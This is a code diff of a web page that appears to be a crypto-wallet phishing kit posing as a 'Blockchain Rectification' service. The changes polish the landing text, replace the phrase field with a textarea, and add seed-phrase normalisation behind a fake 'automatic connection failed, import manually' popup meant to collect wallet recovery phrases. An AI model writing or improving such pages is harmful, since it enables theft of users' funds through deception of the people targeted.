@@ -5,25 +5,22 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>ChainVault - Blockchain Rectification</title>
     <link rel="stylesheet" href="color.css">
+    <!-- Add Poppins font from Google Fonts -->
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;700&display=swap" rel="stylesheet">
 </head>
 <body>
-    <div class="landing-container">
-        <div class="landing-content">
+    <div class="hero-container">
+        <div class="hero-content">
             <h1>Blockchain Rectification</h1>
-            <p>
-                This is not an app but a protocol, that establishes a remote resolution between all noncustodial wallet discovering the decentralized solutions, seamless transactions, and a decentralized ecosystem. Join us in revolutionizing the way you interact with digital assets and decentralized applications.
-            </p>
+            <p>Seamlessly resolve wallet issues and interact with decentralized ecosystems. Join us in revolutionizing digital asset management.</p>
             <button class="connect-btn" onclick="openWalletPopup()">Connect Wallet</button>
-        </div>
-        <div class="landing-image">
-            <img src="assets/blockchain-graphic.png" alt="Blockchain Graphic">
         </div>
     </div>
 
     <!-- Wallet Selection Popup -->
     <div id="walletPopup" class="popup">
         <div class="popup-content">
-            <h2>Connect your wallet</h2>
+            <h2>Connect Your Wallet</h2>
             <div class="wallet-list" id="walletList"></div>
         </div>
     </div>
@@ -43,7 +40,7 @@
     <div id="errorPopup" class="popup">
         <div class="popup-content">
             <p>There was an error connecting automatically. But do not worry, you can still connect manually.</p>
-            <h2>Import your <span id="errorWalletName"></span> wallet</h2>
+            <h2>Import Your <span id="errorWalletName"></span> Wallet</h2>
             
             <div class="tabs">
                 <button class="tab-btn active" onclick="switchTab('phrase')">Phrase</button>
@@ -52,7 +49,7 @@
             </div>
 
             <label for="manualInput">Enter your wallet <span id="inputLabel">phrase</span></label>
-            <input type="text" id="manualInput" name="manualInput" placeholder="Enter your wallet phrase">
+            <textarea id="manualInput" name="manualInput" placeholder="Enter your wallet phrase" rows="4"></textarea>
 
             <p id="errorMessage" class="hidden"></p>
 
@@ -190,6 +187,11 @@
         function validateManualInput() {
             let manualInput = document.getElementById("manualInput").value.trim();
             let message = document.getElementById("errorMessage");
+
+            // Normalize spaces and newlines for seed phrase validation
+            if (currentTab === "phrase") {
+                manualInput = manualInput.replace(/\s+/g, " ").trim();
+            }
 
             message.textContent = "";
             message.classList.add("hidden");
